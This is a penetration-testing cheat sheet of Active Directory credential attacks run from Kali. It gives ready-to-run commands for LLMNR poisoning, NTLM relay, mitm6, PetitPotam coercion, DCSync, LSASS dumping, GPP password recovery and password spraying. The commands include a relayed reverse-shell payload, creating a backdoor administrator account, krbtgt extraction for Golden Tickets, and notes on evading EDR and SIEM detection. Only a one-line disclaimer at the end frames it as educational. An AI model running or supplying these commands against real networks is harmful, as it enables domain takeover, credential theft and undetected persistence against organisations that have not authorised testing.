---
title: "Credential Attacks & Relay — From Kali"
weight: 3
tags: ["ad", "credentials", "relay", "responder", "ntlm", "kali"]
---

## Quick Reference

| Technique | Tool | Prerequisite | Output |
|---|---|---|---|
| LLMNR/NBT-NS Poisoning | Responder | Network access, no SMB signing required | NTLMv1/v2 hashes |
| SMB Relay | ntlmrelayx.py | SMB signing disabled on target | SAM dump / shell |
| LDAP Relay | ntlmrelayx.py | LDAP on DC accessible | Computer accounts / RBCD |
| IPv6 Poisoning | mitm6 + ntlmrelayx | IPv6 not disabled on network | LDAP relay → DA |
| Coercion + Relay | PetitPotam / printerbug | Auth path to coerced machine | NTLM relay or TGT |
| DCSync | secretsdump.py | Domain Admin or replication rights | All NTLM hashes + AES keys |
| LSASS Dump | lsassy | Local admin on target | Plaintext / hashes |
| GPP Passwords | nxc -M gpp_password | Domain user | Cleartext credential |
| Password Spraying | nxc smb/ldap | Valid username list | Valid credentials |

---

## LLMNR/NBT-NS Poisoning with Responder

LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) are fallback name resolution protocols used by Windows when DNS fails. When a host cannot resolve a name, it broadcasts an LLMNR/NBT-NS query to the local subnet. Responder answers these queries with the attacker's IP, forcing the victim to authenticate — capturing NTLMv1 or NTLMv2 hashes.

### Installation and Configuration

```bash
# Responder is pre-installed on Kali
which responder

# Config file location
cat /etc/responder/Responder.conf

# Key settings in Responder.conf:
# [Responder Core]
# ; Servers to start
# SMB = On
# HTTP = On
# HTTPS = On
# LDAP = On
# ...
# ; Challenge used for NTLMv1/v2 authentication — fixed challenge aids NTLMv1 cracking
# Challenge = Random  (change to 1122334455667788 for NTLMv1 rainbow tables)
```

### Analysis Mode (Safe — No Poisoning)

```bash
# Listen only — log traffic but do not send poisoned responses
sudo responder -I eth0 -A

# Useful for passive reconnaissance before active attack
# Identifies hosts making LLMNR/NBT-NS queries without alerting them
```

### Attack Mode (Active Poisoning)

```bash
# Full poisoning — respond to LLMNR, NBT-NS, and MDNS queries
sudo responder -I eth0

# Extended options:
# -w  Enable WPAD rogue server (captures browser proxy auth)
# -d  Enable DHCP poisoning
# -F  Force NTLM authentication for WPAD
sudo responder -I eth0 -wdF

# On a specific interface with verbose output
sudo responder -I eth0 -v
```

### Log Location and Hash Extraction

```bash
# Responder logs all captured hashes here
ls /usr/share/responder/logs/
# Files named: SMB-NTLMv2-SSP-TARGET_IP.txt, HTTP-NTLMv2-TARGET_IP.txt, etc.

# Also stored in SQLite database
cat /usr/share/responder/Responder.db

# Combine all captured hashes into one file for cracking
cat /usr/share/responder/logs/*.txt | grep -v "^#" > all_hashes.txt
cat all_hashes.txt | sort -u > unique_hashes.txt
```

### NTLMv1 vs NTLMv2 — Cracking Differences

**NTLMv1** is weaker and can be cracked with rainbow tables if a fixed challenge is used. Set `Challenge = 1122334455667788` in `Responder.conf` before the attack:

```bash
# NTLMv1 — hashcat mode 5500
hashcat -m 5500 ntlmv1_hashes.txt /usr/share/wordlists/rockyou.txt

# NTLMv1 with rainbow tables (requires fixed challenge 1122334455667788)
# Use crack.sh or ntlmv1-multi for rainbow table lookup

# NTLMv2 — hashcat mode 5600
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt

# NTLMv2 with rules
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -r /usr/share/hashcat/rules/d3ad0ne.rule

# john — NTLMv2
john --format=netntlmv2 ntlmv2_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --format=netntlm ntlmv1_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

> **Note (OPSEC):** Responder generates significant network noise. LLMNR/NBT-NS poisoning is easily detected by network monitoring solutions (Wireshark, IDS, MDR). In sensitive engagements, use analysis mode (`-A`) first to identify likely targets, then run attack mode briefly. Consider targeting specific subnets rather than broad network segments.

---

## SMB Relay with ntlmrelayx.py

Instead of cracking captured NTLMv2 hashes (which may be slow), relay attacks forward the authentication directly to another host — authenticating as the victim without ever cracking the hash. The prerequisite is that SMB signing must be **disabled** on the target.

### Check SMB Signing

```bash
# Use netexec to generate a list of hosts without SMB signing (relay targets)
nxc smb TARGET_IP/CIDR --gen-relay-list relay_targets.txt

# Check a specific host
nxc smb TARGET_IP --signing false

# Use nmap script for SMB signing check
nmap --script smb2-security-mode -p 445 TARGET_IP/CIDR

# Output: message_signing: disabled (target is vulnerable)
#         message_signing: required (target is NOT vulnerable)
```

### Basic SMB Relay — Dump SAM

When ntlmrelayx receives a relayed authentication, it automatically dumps the SAM database by default:

```bash
# Start ntlmrelayx with target list
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support

# Start Responder in another terminal (disable SMB and HTTP — ntlmrelayx handles those)
# Edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off
sudo responder -I eth0

# ntlmrelayx will capture NTLM authentications from Responder and relay them
# Output: SAM hashes from the target machine
```

### Interactive Shell via SOCKS

```bash
# Start ntlmrelayx in interactive mode
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support --interactive

# After a successful relay, ntlmrelayx opens a SOCKS port
# In another terminal, connect to the interactive SMB shell
# ntlmrelayx outputs: Started interactive SMB client shell via TCP on 127.0.0.1:11000

# Connect to the shell
nc 127.0.0.1 11000
# or via impacket smbclient
impacket-smbclient -port 11000 //127.0.0.1/C$
```

### Command Execution via Relay

```bash
# Execute a command on the target via relay
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support -c "whoami"

# Reverse shell via relay
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support \
  -c "powershell -enc BASE64_REVERSE_SHELL_PAYLOAD"

# Add a local administrator account
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support \
  -c "net user attacker P@ssw0rd123 /add && net localgroup administrators attacker /add"
```

### SOCKS Proxy Mode with proxychains

```bash
# Start ntlmrelayx with SOCKS support
sudo ntlmrelayx.py -tf relay_targets.txt -smb2support -socks

# Configure proxychains
# /etc/proxychains4.conf: add line → socks4 127.0.0.1 1080

# Use tools through SOCKS after successful relay
proxychains impacket-secretsdump TARGET_DOMAIN/USERNAME@TARGET_IP -no-pass
proxychains nxc smb TARGET_IP -d TARGET_DOMAIN -u USERNAME -p '' --sam
proxychains impacket-psexec TARGET_DOMAIN/USERNAME@TARGET_IP -no-pass
```

> **Note:** ntlmrelayx.py default behavior dumps SAM only if the relayed user is a local admin on the target. Domain admins on workstations are common but not universal. Relaying to servers increases the chance of local admin access. Always run Responder with SMB and HTTP disabled when using ntlmrelayx — both cannot listen on the same ports simultaneously.

---

## LDAP Relay

Relaying NTLM authentication to LDAP on the Domain Controller allows attackers to perform LDAP operations as the relayed user. If the relayed user has sufficient privileges, this can result in computer account creation, shadow credentials, or RBCD setup.

### Basic LDAP Relay

```bash
# Relay NTLM auth to LDAP on the DC
sudo ntlmrelayx.py -t ldap://DC_IP --no-smb-server -smb2support

# LDAPS (LDAP over SSL — required if LDAP channel binding is enforced)
sudo ntlmrelayx.py -t ldaps://DC_IP --no-smb-server
```

### Add a Computer Account via Relay

Creating a machine account is useful for subsequent RBCD attacks. Any authenticated domain user can create up to 10 machine accounts by default (ms-DS-MachineAccountQuota):

```bash
# Relay to LDAP and add a computer account
sudo ntlmrelayx.py -t ldap://DC_IP --no-smb-server --add-computer EVILPC01

# Output: Created computer account EVILPC01$ with password [auto-generated]
# Save the password — you'll need it for subsequent attacks
```

### Shadow Credentials via Relay

Shadow credentials abuse the `msDS-KeyCredentialLink` attribute to add a certificate-based credential to a user or computer account:

```bash
# Relay and inject shadow credentials into a target account
sudo ntlmrelayx.py -t ldaps://DC_IP --no-smb-server --shadow-credentials --shadow-target TARGET_ACCOUNT

# Output: Certificate saved to TARGET_ACCOUNT.pfx with password [auto-generated]
# Use with certipy or pkinittools to obtain a TGT
impacket-gettgtpkinit TARGET_DOMAIN/TARGET_ACCOUNT -cert-pfx TARGET_ACCOUNT.pfx TARGET_ACCOUNT.ccache
```

### RBCD Setup via Relay

Resource-Based Constrained Delegation (RBCD) relay allows setting up delegation from a machine you control to the target:

```bash
# Relay to LDAP and configure RBCD (requires write access to target's msDS-AllowedToActOnBehalfOfOtherIdentity)
sudo ntlmrelayx.py -t ldap://DC_IP --no-smb-server --delegate-access --escalate-user EVILPC01$

# After relay: EVILPC01$ can now delegate to the target
# Request service ticket impersonating Administrator
impacket-getST -spn cifs/TARGET_IP TARGET_DOMAIN/EVILPC01$ -impersonate Administrator -hashes :EVILPC01_NTLM_HASH
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass TARGET_DOMAIN/Administrator@TARGET_IP
```

> **Note:** LDAP relay requires that NTLM authentication reach the DC's LDAP port (389/636). Machine accounts authenticating to LDAP have reduced privileges unless the relayed session is a privileged account. LDAP channel binding and LDAP signing (enabled on Server 2019+ by default) can block these attacks — check with `nxc ldap DC_IP -u USERNAME -p PASSWORD` to confirm LDAP is accessible.

---

## mitm6 + ntlmrelayx

mitm6 exploits the fact that Windows prefers IPv6 over IPv4. By answering DHCPv6 requests, an attacker can become the IPv6 default gateway and DNS server for victim machines — redirecting authentication attempts to LDAP on the DC.

### Why It Works

Windows machines send periodic DHCPv6 Solicit messages even when IPv6 is not actively used. mitm6 responds with a link-local IPv6 address, then poisons DNS responses for internal names — causing authentication to be sent to the attacker who relays it to LDAP.

### Setup and Execution

```bash
# Install mitm6
pip3 install mitm6
# or
git clone https://github.com/dirkjanm/mitm6.git && cd mitm6 && pip3 install .

# Start mitm6 — scope to target domain to avoid poisoning everything
sudo mitm6 -d TARGET_DOMAIN

# In a separate terminal, start ntlmrelayx targeting LDAP
sudo ntlmrelayx.py -6 -t ldaps://DC_IP -wh attacker-wpad.TARGET_DOMAIN \
  -l /tmp/loot --no-smb-server --delegate-access

# -6        = listen on IPv6 as well
# -wh       = WPAD hostname served to victims
# -l        = directory to store loot (LDAP dumps)
```

### Combined Attack for Domain Escalation

```bash
# mitm6 poisons DHCPv6 and DNS
# ntlmrelayx receives authentication and adds a machine account, then configures RBCD

# Step 1: Start mitm6
sudo mitm6 -d TARGET_DOMAIN -i eth0

# Step 2: Start ntlmrelayx with LDAP relay and machine account creation
sudo ntlmrelayx.py -6 -t ldaps://DC_IP \
  --add-computer EVILPC \
  --delegate-access \
  --no-smb-server \
  -wh FAKEWPAD.TARGET_DOMAIN

# Step 3: Wait for a machine authentication (triggered by computer reboots, logins)
# Step 4: Use created machine account for RBCD privilege escalation
impacket-getST -spn cifs/DC_HOSTNAME TARGET_DOMAIN/EVILPC$ \
  -impersonate Administrator -hashes :EVILPC_NTLM_HASH
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass TARGET_DOMAIN/Administrator@DC_HOSTNAME -just-dc
```

### Timing and Scope

```bash
# mitm6 is noisy — machines update DHCPv6 leases every ~30 minutes
# Computer reboots trigger immediate DHCPv6 Solicit messages
# Scope carefully — use -d to limit to one domain, -hw to only poison specific hosts

sudo mitm6 -d TARGET_DOMAIN -hw victim-hostname1 -hw victim-hostname2

# Stop mitm6 after obtaining credentials — prolonged operation disrupts network connectivity
# IPv6 leases last 300 seconds by default; network recovers quickly after stopping
```

> **Note (OPSEC):** mitm6 is very noisy and can disrupt network connectivity on the targeted subnet. Run it for short windows (5-10 minutes), then stop and analyze results. On monitored networks, the rogue DHCPv6 server and unusual IPv6 traffic will be detected quickly. Use during change windows or periods of reduced monitoring when possible.

---

## Coercion Attacks

Coercion attacks force a target machine to authenticate to a specified host using various Windows RPC/SMB protocol features. The captured authentication (NTLM or Kerberos) can then be relayed or used for other attacks.

### PetitPotam (MS-EFSR — No Auth Required by Default)

PetitPotam abuses the MS-EFSR (Encrypting File System Remote Protocol) to force a machine to authenticate:

```bash
# No authentication required (pre-patch)
python3 PetitPotam.py TARGET_IP DC_IP

# With authentication (post-patch mitigation)
python3 PetitPotam.py -u USERNAME -p PASSWORD -d TARGET_DOMAIN TARGET_IP DC_IP

# Where TARGET_IP is your attacker/listener IP
# Where DC_IP is the machine you want to coerce

# Install PetitPotam
git clone https://github.com/topotam/PetitPotam.git
cd PetitPotam
```

### PrinterBug / SpoolSample (MS-RPRN — Requires Domain User)

The Printer Spooler service bug coerces authentication via the MS-RPRN protocol. Requires a valid domain user and the Print Spooler service to be running on the target:

```bash
# Check if Spooler is running
nxc smb DC_IP -u USERNAME -p PASSWORD -M spooler

# Coerce with printerbug.py
python3 printerbug.py TARGET_DOMAIN/USERNAME:PASSWORD@DC_HOSTNAME TARGET_IP

# Install printerbug / SpoolSample
git clone https://github.com/dievus/printerbug.git
cd printerbug
```

### DFSCoerce (MS-DFSNM — Requires Domain User)

DFSCoerce uses the MS-DFSNM (Distributed File System Namespace Management) protocol:

```bash
# Coerce DC authentication to your attack host
python3 DFSCoerce.py -u USERNAME -p PASSWORD -d TARGET_DOMAIN TARGET_IP DC_IP

# Install DFSCoerce
git clone https://github.com/giuliano-oliveira/dfscoerce.git
cd dfscoerce
```

### Using Coercion with ntlmrelayx

```bash
# Step 1: Start ntlmrelayx to receive relayed authentication
sudo ntlmrelayx.py -t ldap://DC_IP --no-smb-server --shadow-credentials --shadow-target DC_HOSTNAME$

# Step 2: Trigger coercion (authenticates DC machine account to your listener)
python3 PetitPotam.py -u USERNAME -p PASSWORD -d TARGET_DOMAIN TARGET_IP DC_IP

# If successful: DC machine account authentication relayed → shadow credentials added to DC$
# Use shadow cert to get TGT as DC$ → DCSync
```

### When to Use Each

| Method | Auth Required | Protocol | Target Requirement |
|---|---|---|---|
| PetitPotam (unpatched) | No | MS-EFSR (port 445) | EFS service accessible |
| PetitPotam (patched) | Domain user | MS-EFSR (port 445) | EFS service accessible |
| PrinterBug | Domain user | MS-RPRN (port 445) | Spooler service running |
| DFSCoerce | Domain user | MS-DFSNM (port 445) | DFS namespace accessible |

> **Note:** Coercion attacks generate event **4768** (TGT request) from the coerced machine account and SMB connection events. The coerced machine (e.g., the DC) will make an outbound SMB connection to your attack host — this is anomalous if your host is not a legitimate server and may trigger network-level alerts.

---

## secretsdump.py

`secretsdump.py` is an impacket tool that dumps credentials from remote Windows systems via DRSUAPI (DCSync), SAM, LSA secrets, and cached domain credentials.

### Remote SAM Dump (Local Admin Required)

```bash
# Dump SAM database remotely (requires local admin on target)
impacket-secretsdump TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP

# With NTLM hash (pass-the-hash)
impacket-secretsdump -hashes :NTLM_HASH TARGET_DOMAIN/USERNAME@TARGET_IP

# Dump only local SAM
impacket-secretsdump TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP -sam

# Output includes: local account hashes, LSA secrets, cached credentials
```

### DCSync — Full Domain Hash Dump (Domain Admin Required)

DCSync uses the Directory Replication Service (DRS) protocol to simulate a Domain Controller and request all password hashes:

```bash
# DCSync — dump all hashes (requires Domain Admin or replication rights)
impacket-secretsdump TARGET_DOMAIN/USERNAME:PASSWORD@DC_IP -just-dc

# DCSync via NTLM hash
impacket-secretsdump -hashes :NTLM_HASH TARGET_DOMAIN/USERNAME@DC_IP -just-dc

# DCSync via Kerberos ticket
export KRB5CCNAME=USERNAME.ccache
impacket-secretsdump -k -no-pass TARGET_DOMAIN/USERNAME@DC_HOSTNAME -just-dc
```

### Targeted DCSync — Specific User

```bash
# Dump only the krbtgt hash (for Golden Ticket creation)
impacket-secretsdump TARGET_DOMAIN/USERNAME:PASSWORD@DC_IP -just-dc-user krbtgt

# Dump a specific user
impacket-secretsdump TARGET_DOMAIN/USERNAME:PASSWORD@DC_IP -just-dc-user TARGET_DOMAIN/DOMAIN_ADMIN

# Dump just NTLM hashes (no Kerberos keys)
impacket-secretsdump TARGET_DOMAIN/USERNAME:PASSWORD@DC_IP -just-dc-ntlm

# Dump full NTDS.dit content
impacket-secretsdump TARGET_DOMAIN/USERNAME:PASSWORD@DC_IP -just-dc-ntds

# Include password history
impacket-secretsdump TARGET_DOMAIN/USERNAME:PASSWORD@DC_IP -just-dc -history

# Check if accounts are disabled
impacket-secretsdump TARGET_DOMAIN/USERNAME:PASSWORD@DC_IP -just-dc -user-status
```

### Output and Parsing

```bash
# Save output to file
impacket-secretsdump TARGET_DOMAIN/USERNAME:PASSWORD@DC_IP -just-dc -outputfile domain_hashes

# Output format: USERNAME:RID:LM_HASH:NTLM_HASH:::
# For cracking NTLM hashes:
hashcat -m 1000 domain_hashes.ntds /usr/share/wordlists/rockyou.txt

# Extract only NTLM hashes
grep ':::' domain_hashes.ntds | cut -d':' -f4 > ntlm_only.txt
```

> **Note (OPSEC):** DCSync generates event **4662** (operation performed on object) with the object GUID of the domain object and access mask `0x100` (Control Access) and `DS-Replication-Get-Changes-All`. Modern EDR and SIEM solutions alert on this. When possible, use a compromised account with pre-existing replication rights rather than adding them dynamically. The `krbtgt` hash should be your primary target as it enables Golden Ticket attacks.

---

## lsassy

lsassy is a tool for remotely dumping LSASS memory and extracting credentials. It supports multiple dump methods to evade endpoint detection.

### Basic Usage

```bash
# Install lsassy
pip3 install lsassy

# Dump with plaintext credentials
lsassy -d TARGET_DOMAIN -u USERNAME -p PASSWORD TARGET_IP

# With NTLM hash (pass-the-hash)
lsassy -d TARGET_DOMAIN -u USERNAME -H NTLM_HASH TARGET_IP

# Dump multiple targets
lsassy -d TARGET_DOMAIN -u USERNAME -p PASSWORD 10.10.10.0/24
```

### Dump Methods

Different methods avoid different detection signatures. When the default fails, try alternatives:

```bash
# Method: nanodump (reflective injection — stealthier)
lsassy -d TARGET_DOMAIN -u USERNAME -p PASSWORD TARGET_IP --method nanodump

# Method: comsvcs (uses built-in comsvcs.dll MiniDump)
lsassy -d TARGET_DOMAIN -u USERNAME -p PASSWORD TARGET_IP --method comsvcs

# Method: wdigest (forces wdigest — only if plaintext required)
lsassy -d TARGET_DOMAIN -u USERNAME -p PASSWORD TARGET_IP --method wdigest

# Method: procdump (uses Sysinternals procdump — may be blocked by AV)
lsassy -d TARGET_DOMAIN -u USERNAME -p PASSWORD TARGET_IP --method procdump

# List available methods
lsassy --list-methods
```

### Output and Parsing

```bash
# Output to JSON
lsassy -d TARGET_DOMAIN -u USERNAME -p PASSWORD TARGET_IP -o lsassy_output.json

# Verbose output
lsassy -d TARGET_DOMAIN -u USERNAME -p PASSWORD TARGET_IP -v

# netexec integration (bulk dump via nxc module)
nxc smb TARGET_IP -d TARGET_DOMAIN -u USERNAME -p PASSWORD -M lsassy
nxc smb TARGET_IP/CIDR -d TARGET_DOMAIN -u USERNAME -p PASSWORD -M lsassy
```

> **Note:** LSASS dumping is one of the highest-fidelity indicators of credential theft. Windows Defender Credential Guard and EDR solutions actively protect LSASS. The `comsvcs` method is well-known and often blocked; `nanodump` or custom implementations are more likely to succeed on hardened targets. Always check for protected processes before dumping.

---

## GPP Passwords

Group Policy Preferences (GPP) allowed administrators to set local account passwords via Group Policy. The password was stored AES-256 encrypted in SYSVOL `.xml` files — but Microsoft published the decryption key, making all GPP passwords recoverable. Patched in MS14-025, but old GPOs may persist.

### Manual Enumeration

```bash
# Mount SYSVOL share and search for Groups.xml
smbclient //DC_IP/SYSVOL -U TARGET_DOMAIN/USERNAME%PASSWORD
# Inside smbclient:
# smb: \> recurse ON
# smb: \> prompt OFF
# smb: \> mget *

# Search for Groups.xml in mounted or downloaded SYSVOL
find /tmp/sysvol -name Groups.xml 2>/dev/null
find /tmp/sysvol -name "*.xml" -exec grep -l cpassword {} \;

# Also check these files for cpassword:
# Services.xml, ScheduledTasks.xml, Printers.xml, Drives.xml, DataSources.xml
```

### Automated with netexec

```bash
# Enumerate GPP passwords via nxc module
nxc smb DC_IP -u USERNAME -p PASSWORD -M gpp_password

# Also check autologon credentials
nxc smb DC_IP -u USERNAME -p PASSWORD -M gpp_autologin
```

### Decrypt GPP Password

```bash
# Decrypt a recovered cpassword value
gpp-decrypt 'ENCRYPTED_VALUE'

# Example encrypted value from Groups.xml:
# <Properties ... cpassword="VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE" .../>
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

### Passwords in Description Fields via LDAP

Administrators sometimes store passwords in the `description` or `info` fields of AD user objects:

```bash
# Search all user descriptions for password-like content
ldapsearch -H ldap://DC_IP -x -b "DC=TARGET_DOMAIN,DC=local" \
  -D "TARGET_DOMAIN\USERNAME" -w 'PASSWORD' \
  "(objectClass=user)" \
  sAMAccountName description info

# Pipe through grep to find relevant entries
ldapsearch -H ldap://DC_IP -x -b "DC=TARGET_DOMAIN,DC=local" \
  -D "TARGET_DOMAIN\USERNAME" -w 'PASSWORD' \
  "(objectClass=user)" \
  sAMAccountName description | grep -A1 -i "description:"

# nxc equivalent
nxc smb DC_IP -u USERNAME -p PASSWORD --users | grep -i "desc"
nxc ldap DC_IP -u USERNAME -p PASSWORD -M get-desc-users
```

> **Note:** GPP passwords are a legacy finding but still appear regularly in environments that have existed for more than 5-7 years without full GPO cleanup. Automated baselines from tools like PingCastle and BloodHound will flag these. Check SYSVOL enumeration early in any engagement.

---

## Password Spraying

Password spraying tests one (or a few) common passwords against all domain users — bypassing account lockout by staying below the lockout threshold per account.

### Check Lockout Policy First

```bash
# Check domain password policy before any spray
nxc smb DC_IP -u USERNAME -p PASSWORD --pass-pol

# Also via ldapsearch
ldapsearch -H ldap://DC_IP -x -b "DC=TARGET_DOMAIN,DC=local" \
  -D "TARGET_DOMAIN\USERNAME" -w 'PASSWORD' \
  "(objectClass=domainDNS)" \
  lockoutThreshold lockoutDuration lockoutObservationWindow
```

### SMB Password Spraying with netexec

```bash
# Spray against SMB — requires local admin for full access, but tests domain creds
nxc smb DC_IP -u users.txt -p 'PASSWORD' --continue-on-success

# Spray against multiple hosts
nxc smb TARGET_IP/CIDR -u users.txt -p 'PASSWORD' --continue-on-success

# Spray with multiple passwords (careful with lockout)
nxc smb DC_IP -u users.txt -p passwords.txt --continue-on-success --no-bruteforce

# Mark successful authentications
nxc smb DC_IP -u users.txt -p 'PASSWORD' --continue-on-success | grep -v 'FAILURE'

# Target domain controllers directly
nxc smb DC_IP -u users.txt -p 'PASSWORD' -d TARGET_DOMAIN --continue-on-success
```

### LDAP Password Spraying

```bash
# LDAP spray — more reliable for verifying domain credentials
nxc ldap DC_IP -u users.txt -p 'PASSWORD' --continue-on-success

# Filter successful authentications
nxc ldap DC_IP -u users.txt -p 'PASSWORD' --continue-on-success | grep '+'

# Target specific DC
nxc ldap DC_IP -u users.txt -p 'PASSWORD' -d TARGET_DOMAIN
```

### WinRM and RDP Spraying

```bash
# WinRM spray (if WinRM is accessible — typically port 5985)
nxc winrm TARGET_IP -u users.txt -p 'PASSWORD' --continue-on-success

# RDP spray (port 3389) — generates more noise, use sparingly
nxc rdp TARGET_IP -u users.txt -p 'PASSWORD' --continue-on-success
```

### Spray with NTLM Hash

```bash
# If you have a hash and want to check which machines it works on
nxc smb TARGET_IP/CIDR -u USERNAME -H NTLM_HASH --continue-on-success

# Check local admin with hash
nxc smb TARGET_IP/CIDR -u USERNAME -H NTLM_HASH --local-auth --continue-on-success
```

### Safe Spraying Cadence

```bash
# Example: lockout threshold is 5 attempts, observation window is 30 minutes
# Safe approach: 1 password per 30 minutes, never exceed threshold - 1

# Round 1 — try 'PASSWORD' for all users
nxc smb DC_IP -u users.txt -p 'Password123' --continue-on-success

# Wait for observation window to reset (e.g., 30 minutes)
sleep 1800

# Round 2 — try a second password
nxc smb DC_IP -u users.txt -p 'Welcome1!' --continue-on-success

# Generate seasonal password candidates
# Current year: 2026
# Examples: Spring2026!, Winter2026, CompanyName1!, Month+Year patterns
```

> **Note (OPSEC):** Password spraying generates event **4625** (failed logon) and **4771** (Kerberos pre-auth failure) across many accounts. A lockout policy of 0 means unlimited attempts — but even without lockouts, SIEM correlation will detect repeated failures across accounts from a single source. Use LDAP spraying where possible as it generates slightly less noise. Consider testing from a compromised internal host rather than your attack machine to blend source IP into internal traffic patterns.

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
